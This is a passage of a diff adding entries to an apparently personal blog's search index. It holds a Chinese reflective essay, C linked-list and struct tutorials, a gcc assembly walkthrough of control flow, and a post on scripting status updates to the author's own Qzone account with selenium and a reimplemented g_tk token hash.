+<p>//时间带来行为和意愿的回报。种子若被日光照耀，会开花结果。我们即便是一群时时失去自知的农人，面对的依然是一片井然有序的土地——收获会是什么，以及可曾照料这些被双手埋入泥土之中的种子。</p>
+<p>//有人说，有时也许只是自己内心的美好投射给他人，使一些存在变得美好。但这的确是一个工作，并且与他人无关。你所做的一切首先是要使自己的负面源泉被切断，不要让它像火焰一样四处去点燃更多人的烦恼和嗔恨。使自己和他人流淌出清凉，这是一种累积。见到，一切均是心的轨道，虚弱归于肤浅，质朴归于纯真。</p>
+<p>//如果没有得到想要的，那是因为的确还没有做到足够的好，无法做到平等地与任一人分享内在的美好。没有其他理由。而在心真正清楚的时候，我们所遇见的每一个人每一件事每一段风光，都可以带来意义。</p>
+<p>//有时我想，所有人都是一样的。在各自粉饰的外表下都有千疮百孔的人生和一个暗黑的深渊。如果了知这些，不会觉得自己特别，也不会觉得自己无辜。时间飞逝，人生百味杂陈，无法言说。仿佛一个人写了长长的信，但未等到那个可以投递的人。被阅读被接纳被理解是奢侈的。此刻做一个可以独自静静写信的人，也已不错。</p>
+<p>//我是个旧式样的人，喜欢用手工慢慢做东西的时代。那个时代，有人跋涉千山万水只为相见一面，鸿雁往来耐心等待，春夜无事庭院中闲坐，聆听雨水跌在芭蕉叶上，盖一座亭阁只为观望盛开的杏花。如果遇见生命中一个重要的人，我知道，在我等待他良久的时候，他也已经等待我良久。我们各自都应该是美而好的。</p>
+<p>//如同昨日我去买盆景，看到一对老人头发白了，气定神闲，容色干净，照料着姿态古雅的盆景。盆景也像它们的主人。我买了一盆大阪松，一盆垂丝海棠。什么样的人，种出什么样的东西。把盆景搁置好，桃花枝和白梅养在清水中。我想当我们遇见，将会找到一个地方，看花，喝茶，并肩坐着，说些絮絮叨叨温柔而轻声的话。不知不觉，就让岁月又翻了一页。</p>
+<p>如果在任何变化中存在着接纳和顺受，那么即便是终结，也依然呈现着优雅和自在。最终一切逝灭都会朝向新生。</p>
+<p>一切都有期限。只需往前走。执着过的，放空了。拖累过的，分解了。困顿过的，单纯了。被击伤过的，越过了它。如此，即便是有着微微伤感，也如同被清洗。若此刻没有一丝的期待或恐惧，就是当下最为完美的时分。而那一刻，心就像那秋天树枝上饱满的果实，悬挂着，知道会坠落，无念无想，不忧不虑，只是随顺因缘。</p>
+<p>如此，天上一年，人间一世。</p>
+<p>我从不奢望长久，只希望活得彻底。燃烧充分，展示出纯度。不停上演的生老病死，论证这个物质世界的变幻无常和岌岌可危。我们已知道它的苦，就可以快乐而不复杂地参与它的游戏。</p>
+<p>最漫长的爱，其实是与自己相爱。但如果某天，我遇见了你，会邀请你一起与我跃入海洋。只有当我们各自成为渺小的水珠，彼此才会永恒地在一起。如同一段我所喜欢的经文：“世界是一座桥梁，你可以跨过它，但不要在其上建房。”我们的爱，也是如此。</p>
+]]></content>
+      <tags>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>About learning linked_list</title>
+    <url>/2017/10/24/linked_list/</url>
+    <content><![CDATA[<blockquote>
+<p>some Pointer and Struct practicing</p>
+</blockquote>
+<p>链表由两部分组成，一部分是指针区，一部分是数据区，这里要说的是单链表，指针区仅仅只是下一个节点的地址，为了简化程序，数据区也只设置一个整型变量</p>
+<a id="more"></a>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义结构体,并且规定新类型node</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> data;<span class="comment">//数据区</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//连接节点的量</span></span><br><span class="line">&#125;node;</span><br><span class="line"><span class="comment">//初始化头节点</span></span><br><span class="line"><span class="function">node * <span class="title">node_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	node * head = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));<span class="comment">//为头节点分配内存空间</span></span><br><span class="line">	head -&gt; next = <span class="literal">NULL</span>;<span class="comment">//后一个节点置空</span></span><br><span class="line">	head -&gt; data = <span class="number">-1</span>;<span class="comment">//头节点的数据</span></span><br><span class="line">	<span class="keyword">return</span> head;<span class="comment">//返回头节点的地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在链表末尾添加节点，返回节点指针</span></span><br><span class="line"><span class="function">node * <span class="title">node_add</span><span class="params">(node *head, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">	node * newnode = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));<span class="comment">//为新节点分配空间</span></span><br><span class="line">	<span class="keyword">if</span>(!newnode)<span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果分配失败就返回空指针</span></span><br><span class="line">	node *p = head;<span class="comment">//定义指向头节点的临时指针</span></span><br><span class="line">	<span class="keyword">while</span>(p -&gt; next != <span class="literal">NULL</span> )p = p -&gt; next;<span class="comment">//临时指针移动到末尾</span></span><br><span class="line">	p -&gt; next = newnode;<span class="comment">//把新节点接到末尾</span></span><br><span class="line">	newnode -&gt; next = <span class="literal">NULL</span>;<span class="comment">//新节点的后节点置空</span></span><br><span class="line">	newnode -&gt; data = data;<span class="comment">//新节点储存数据</span></span><br><span class="line">	<span class="keyword">return</span> newnode;<span class="comment">//返回新节点地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印链表所有节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">list_print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">	node *p = head;<span class="comment">//定义指向头节点的临时指针</span></span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"node(%d):%d\n"</span>, x, p -&gt; data);</span><br><span class="line">		p = p -&gt; next;<span class="comment">//不断指向下一节点</span></span><br><span class="line">		x++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在指定节点末尾插入新的节点（头节点为0号），返回节点指针</span></span><br><span class="line"><span class="function">node * <span class="title">node_insert</span><span class="params">(node *head, <span class="keyword">int</span> i,<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">	node * newnode = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));<span class="comment">//为新节点分配空间</span></span><br><span class="line">	<span class="keyword">if</span>(!newnode)<span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果分配失败就返回空指针</span></span><br><span class="line">	newnode -&gt; data = data;<span class="comment">//新节点储存数据</span></span><br><span class="line">	node * p = head;<span class="comment">//定义指向头节点的临时指针</span></span><br><span class="line">	<span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; p -&gt; next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p -&gt; next;</span><br><span class="line">		i--;</span><br><span class="line">	&#125;<span class="comment">//不断指向下一节点,到指定位置</span></span><br><span class="line">	newnode -&gt; next = p -&gt; next;<span class="comment">//把指定位置的下一个节点连接到新节点上</span></span><br><span class="line">	p -&gt; next = newnode;<span class="comment">//把指定位置的节点连接到新节点上</span></span><br><span class="line">	<span class="keyword">return</span> newnode;<span class="comment">//返回新节点的地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除指定节点（头节点为0号）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">node_del</span><span class="params">(node *head, <span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">	node *p1 = head;</span><br><span class="line">	node *p2;</span><br><span class="line">	<span class="keyword">if</span>(i == <span class="number">0</span>)i++;<span class="comment">//不允许删除头节点</span></span><br><span class="line">	<span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; p1 -&gt; next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		i--;</span><br><span class="line">		p2 = p1;</span><br><span class="line">		p1 = p1 -&gt; next;</span><br><span class="line">	&#125;<span class="comment">//p1指向需要删除的节点,p2指向前一节点</span></span><br><span class="line">	p2 -&gt; next = p1 -&gt; next;<span class="comment">//把需要删除的节点空出来</span></span><br><span class="line">	<span class="built_in">free</span>(p1);<span class="comment">//释放内存</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回链表的节点数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_length</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">	node *p = head;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p -&gt; next;</span><br><span class="line">		count++;</span><br><span class="line">	&#125;<span class="comment">//迭代计数</span></span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">list_del</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">	node * p1 = head;</span><br><span class="line">	node * p2;</span><br><span class="line">	<span class="keyword">while</span>(p1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p2 = p1;</span><br><span class="line">		p1 = p1 -&gt; next;</span><br><span class="line">		<span class="built_in">free</span>(p2);</span><br><span class="line">	&#125;<span class="comment">//不断释放指向节点的前一节点内存,最终释放所有内存</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改指定节点的数据（头节点为0号），反回修改的节点的指针</span></span><br><span class="line"><span class="function">node * <span class="title">node_modify</span><span class="params">(node *head, <span class="keyword">int</span> i, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">	node *p = head;</span><br><span class="line">	<span class="keyword">while</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p -&gt; next == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果超出范围,返回空指针</span></span><br><span class="line">		p = p -&gt; next;</span><br><span class="line">		i--;</span><br><span class="line">	&#125;<span class="comment">//寻找需要修改节点的地址</span></span><br><span class="line">	p -&gt; data = data;<span class="comment">//修改数据区</span></span><br><span class="line">	<span class="keyword">return</span> p;<span class="comment">//返回修改过节点的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>try_assembly_0</title>
+    <url>/2017/10/21/try_assembly_0/</url>
+    <content><![CDATA[<blockquote>
+<p>if-else, while/for, switch-case</p>
+<p>编译器：<code>gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</code></p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h2><p>一段c的代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(x == y)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"equal"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"233"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用<code>gcc -c if-else.c</code>得到目标文件</p>
+<p>用<code>objdump -S if-else.o</code>查看代码段的汇编</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0:	55                   	push   %rbp</span><br><span class="line"> 1:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line"> 4:	48 83 ec 10          	sub    $0x10,%rsp</span><br><span class="line"> 8:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)</span><br><span class="line"> f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%rbp)</span><br><span class="line">16:	8b 45 f8             	mov    -0x8(%rbp),%eax</span><br><span class="line">19:	3b 45 fc             	cmp    -0x4(%rbp),%eax</span><br><span class="line">1c:	75 11                	jne    2f &lt;main+0x2f&gt;</span><br><span class="line">1e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">23:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">28:	e8 00 00 00 00       	callq  2d &lt;main+0x2d&gt;</span><br><span class="line">2d:	eb 0f                	jmp    3e &lt;main+0x3e&gt;</span><br><span class="line">2f:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">34:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">39:	e8 00 00 00 00       	callq  3e &lt;main+0x3e&gt;</span><br><span class="line">3e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">43:	c9                   	leaveq </span><br><span class="line">44:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>理解：</p>
+<ul>
+<li>0-f：喜闻乐见的函数开头，压入rbp寄存器的值（保存堆栈帧的基址），把栈指针rsp保存到rbp，栈顶指针下移16字节，（为局部变量保留空间），把x=1,y=2,压入栈中</li>
+<li>16-1c：把x=1放入eax寄存器中，与y=2比较大小，如果不相等，跳转到2f处执行</li>
+<li>1e-28：调用printf的一套操作，清空edi，eax，然后调用</li>
+<li>2d：无条件跳转到3e段</li>
+<li>2f-39：同1e-28</li>
+<li>3e-44：喜闻乐见的函数结尾，把eax清零（返回值为0），恢复堆栈帧（恢复esp的值，弹出ebp的值），函数返回</li>
+</ul>
+<h2 id="while-for"><a href="#while-for" class="headerlink" title="while/for"></a>while/for</h2><p>一段c代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; <span class="number">10</span>; x++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(x &lt; <span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		x++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码段的汇编</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0:	55                   	push   %rbp</span><br><span class="line"> 1:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line"> 4:	48 83 ec 10          	sub    $0x10,%rsp</span><br><span class="line"> 8:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)</span><br><span class="line"> f:	eb 18                	jmp    29 &lt;main+0x29&gt;</span><br><span class="line">11:	8b 45 f8             	mov    -0x8(%rbp),%eax</span><br><span class="line">14:	89 c6                	mov    %eax,%esi</span><br><span class="line">16:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">1b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">20:	e8 00 00 00 00       	callq  25 &lt;main+0x25&gt;</span><br><span class="line">25:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)</span><br><span class="line">29:	83 7d f8 09          	cmpl   $0x9,-0x8(%rbp)</span><br><span class="line">2d:	7e e2                	jle    11 &lt;main+0x11&gt;</span><br><span class="line">2f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)</span><br><span class="line">36:	eb 18                	jmp    50 &lt;main+0x50&gt;</span><br><span class="line">38:	8b 45 fc             	mov    -0x4(%rbp),%eax</span><br><span class="line">3b:	89 c6                	mov    %eax,%esi</span><br><span class="line">3d:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">42:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">47:	e8 00 00 00 00       	callq  4c &lt;main+0x4c&gt;</span><br><span class="line">4c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)</span><br><span class="line">50:	83 7d fc 09          	cmpl   $0x9,-0x4(%rbp)</span><br><span class="line">54:	7e e2                	jle    38 &lt;main+0x38&gt;</span><br><span class="line">56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">5b:	c9                   	leaveq </span><br><span class="line">5c:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>理解：</p>
+<ul>
+<li>0-4：函数头部</li>
+<li>8：局部变量x=0入栈</li>
+<li>f：跳转29处</li>
+<li>11-20：打印x的值</li>
+<li>25：增加x的值</li>
+<li>29-2d：比较9与x的值，小于或等于时跳转11处</li>
+<li>2f：局部变量x=0入栈</li>
+<li>36：跳转50处</li>
+<li>38-47：打印x的值</li>
+<li>4c：增加x的值</li>
+<li>50-54：比较9与x的值，小于或等于时跳转38处</li>
+<li>56-5c：函数尾部</li>
+</ul>
+<p>（for和while的实现方式貌似差不多）</p>
+<h2 id="switch-case"><a href="#switch-case" class="headerlink" title="switch-case"></a>switch-case</h2><p>一段c代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">switch</span>( x )&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">"case 0\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">"case 1\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">"case 2\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">"default\n"</span>);<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码段的汇编</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0:	55                   	push   %rbp</span><br><span class="line"> 1:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line"> 4:	48 83 ec 10          	sub    $0x10,%rsp</span><br><span class="line"> 8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)</span><br><span class="line"> f:	8b 45 fc             	mov    -0x4(%rbp),%eax</span><br><span class="line">12:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">15:	74 15                	je     2c &lt;main+0x2c&gt;</span><br><span class="line">17:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">1a:	74 1c                	je     38 &lt;main+0x38&gt;</span><br><span class="line">1c:	85 c0                	test   %eax,%eax</span><br><span class="line">1e:	75 24                	jne    44 &lt;main+0x44&gt;</span><br><span class="line">20:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">25:	e8 00 00 00 00       	callq  2a &lt;main+0x2a&gt;</span><br><span class="line">2a:	eb 23                	jmp    4f &lt;main+0x4f&gt;</span><br><span class="line">2c:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">31:	e8 00 00 00 00       	callq  36 &lt;main+0x36&gt;</span><br><span class="line">36:	eb 17                	jmp    4f &lt;main+0x4f&gt;</span><br><span class="line">38:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">3d:	e8 00 00 00 00       	callq  42 &lt;main+0x42&gt;</span><br><span class="line">42:	eb 0b                	jmp    4f &lt;main+0x4f&gt;</span><br><span class="line">44:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">49:	e8 00 00 00 00       	callq  4e &lt;main+0x4e&gt;</span><br><span class="line">4e:	90                   	nop</span><br><span class="line">4f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">54:	c9                   	leaveq </span><br><span class="line">55:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>理解：</p>
+<ul>
+<li>0-4：函数头部</li>
+<li>8：x = 1入栈</li>
+<li>f-1a：与1相比较，如果相等的话，跳转2c处，与2相比较，如果相等的话，跳转38处</li>
+<li>1c-1e：尝试x与x的and运算，只改变标志位C，O，如果结果不为0，跳转44处</li>
+<li>20-2a：调用printf函数，跳转4f处（case 0）</li>
+<li>2c-36：调用printf函数，跳转4f处（case 1）</li>
+<li>38-42：调用printf函数，跳转4f处（case 2）</li>
+<li>44-49：调用printf函数（default）</li>
+<li>4e：空指令</li>
+<li>4f-55：函数尾部</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>asm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Crawler</title>
+    <url>/2017/10/13/Crawler/</url>
+    <content><![CDATA[<blockquote>
+<p>一次爬虫的记录与分享</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><p>安装selenium库，使用urllib库，re库</p>
+<h2 id="0x01实现"><a href="#0x01实现" class="headerlink" title="0x01实现"></a>0x01实现</h2><h3 id="selenium模拟登录"><a href="#selenium模拟登录" class="headerlink" title="selenium模拟登录"></a>selenium模拟登录</h3><a id="more"></a>
+<p>emmm,起因是为了实现自动在qzone发送说说，然后到github上去翻了翻，发现轮子都已经失效了（<del>大概没人喜欢做这么无聊的事吧</del><br>登录qzone: i.qq.com，查看到qzone的登录是利用js实现的<br><img src="/images/crawler0.jpg" alt=""></p>
+<p>并没有想去分析qzone的js算法，决定使用selenium模拟登录qzone，不难操作，然后取得当前页面，也就是登录完成的页面的cookie，（注意！用sleep来等待大量数据加载完成，许多操作不能达到预计效果可能是因为网络不佳造成的）</p>
+<p>除了cookie，还有当前页面的源代码也要保存下来（笑</p>
+<h3 id="分析说说发送过程"><a href="#分析说说发送过程" class="headerlink" title="分析说说发送过程"></a>分析说说发送过程</h3><p>在首页随便发送一条说说，截获一条post请求</p>
+<p><img src="/images/crawler1.png" alt=""></p>
+<p>分析结构，发现请求地址很长</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;user.qzone.qq.com&#x2F;proxy&#x2F;domain&#x2F;taotao.qzone.qq.com&#x2F;cgi-bin&#x2F;emotion_cgi_publish_v6?g_tk&#x3D;91245527&amp;qzonetoken&#x3D;010dee36790ae077dbba7521e3e0838b6d9ef25271a9260c8040cd2c2e976f58f614e3ab913c683dfb5c90</span><br></pre></td></tr></table></figure>
+
+
+<p>前面一部分是固定的（除非人为的话，后面有两个参数g_tk和qzonetoken，这是两个为了加密而设置的参数，通过js来获得，qzonetoken的函数源码没有找到，查询网络上的也是一些过时的（算法早就改变了，于是我从主页的源码中扣下来，在最底下，用正则来截取</p>
+<p><img src="/images/crawler2.png" alt=""></p>
+<p>g_tk无法在源码中找到，于是刷新主页，查到在一个<code>interface_mini.js?max_age=60628</code>的js文件里有定义</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">QZONE.FrontPage.getACSRFToken = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  url = QZFL.util.URI(url);</span><br><span class="line">  <span class="keyword">var</span> skey;</span><br><span class="line">  <span class="keyword">if</span> (url) &#123;</span><br><span class="line">    <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qzone.qq.com"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      skey = QZFL.cookie.get(<span class="string">"p_skey"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (url.host &amp;&amp; url.host.indexOf(<span class="string">"qq.com"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        skey = QZFL.cookie.get(<span class="string">"skey"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!skey) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      skey = parent.QZFL.cookie.get(<span class="string">"p_skey"</span>) || <span class="string">""</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      skey = QZFL.cookie.get(<span class="string">"p_skey"</span>) || <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!skey) &#123;</span><br><span class="line">    skey = QZFL.cookie.get(<span class="string">"skey"</span>) || QZFL.cookie.get(<span class="string">"rv2"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hash = <span class="number">5381</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = skey.length;i &lt; len;++i) &#123;</span><br><span class="line">    hash += (hash &lt;&lt; <span class="number">5</span>) + skey.charAt(i).charCodeAt();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> hash &amp; <span class="number">2147483647</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下，用python来重写了g_tk的计算函数（这种操作会因为腾×更新算法而失效，而腾×的更新恰好是比较快的2333</p>
+<h3 id="urllib发送post请求"><a href="#urllib发送post请求" class="headerlink" title="urllib发送post请求"></a>urllib发送post请求</h3><p>没啥好说的，构造post请求头，主体，发送请求</p>
+<p>源码地址：<a href="https://github.com/void0red/code/blob/master/qzone.py" target="_blank" rel="noopener">https://github.com/void0red/code/blob/master/qzone.py</a></p>
+<h2 id="0x03后记"><a href="#0x03后记" class="headerlink" title="0x03后记"></a>0x03后记</h2><p><del>最滑稽的是，这个爬虫并没有实现，运行结果是Bad Request，233333</del></p>
+<p>已经解决，问题在于没有计算请求头中Content-Length的值（笑</p>
+<p>总的来说，程序可用性不高：</p>
+<ol>
+<li>登录是用selenium实现的，加载会占用大量内存与cpu，不适宜在小型设备（例如树莓派）上运行</li>
+<li>两个加密函数有时效性，qzonetoken还好，g_tk的计算就显得有些鸡肋，一旦腾×更改其中的某段代码中的某个参数值，该爬虫就得重新编写（事实上他也是这么做的，可以考虑用正则把js扣出来，放在本地运行，这样程序大概能健壮一些</li>
+<li>程序容错率不高，一旦有环节出错，整个过程无法实现</li>
+</ol>
+<p><del>可喜的是，终于成功爬了qzone，2333</del></p>
+<blockquote>
+<p>void0red 2017.10.13</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>About learning c struct</title>
+    <url>/2017/10/07/struct/</url>
+    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">first</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">second</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">first</span> <span class="title">a</span>;</span></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">third</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">second</span> <span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">first</span> <span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">char</span> y[<span class="number">5</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">third</span> <span class="title">d</span> = &#123;</span>.b = &#123;.x = <span class="number">233</span>,.a = &#123;<span class="string">"huaji"</span>&#125;&#125;,</span><br><span class="line">	.c = &#123;<span class="string">"huaihuai"</span>&#125;,<span class="string">"2333"</span>&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">third</span> * <span class="title">p</span>;</span></span><br><span class="line">	p = &amp;d;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,p -&gt; b.a.name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,p -&gt; b.x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,p -&gt; y);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,d.b.a.name);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">second</span> * <span class="title">z</span>;</span></span><br><span class="line">	z = 